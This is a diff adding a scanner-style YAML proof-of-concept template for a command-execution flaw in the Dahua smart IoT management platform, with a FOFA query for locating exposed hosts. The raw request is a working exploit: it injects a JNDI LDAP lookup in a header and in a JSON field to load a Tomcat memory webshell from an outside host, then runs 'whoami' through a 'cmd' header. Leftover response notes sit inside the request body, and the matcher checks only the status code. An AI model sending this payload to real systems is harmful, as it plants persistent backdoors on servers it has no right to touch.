@@ -1,0 +1,69 @@
+id: poc-tgxyem2fnki54xbp
+info:
+  name: 大华智能物联综合管理平台 is-exist 命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgxyem2fnki54xbp'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tgxyem2fnki54xbp
+    fofa: body="*客户端会小于800*" || body="/static/fontshd/font-hd.css"
+http:
+- raw:
+  - 'POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: application/json, text/plain, /
+
+
+    Accept-Encoding: gzip
+
+
+    Accept-Language: zh-CN
+
+
+    Authorization:
+
+
+    Content-Type: application/json;charset=utf-8
+
+
+    Referer: ${jndi:ldap://www.baidu.com/Basic/TomcatMemshell3}
+
+
+    Timeoffset: -28800000
+
+
+    User-Client: 1
+
+
+    cmd: whoami
+
+
+
+
+    {"loginName":"${jndi:ldap://www.baidu.com/Basic/TomcatMemshell3}"}
+
+
+    # 响应代码特征
+
+    406
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 406
+    type: status
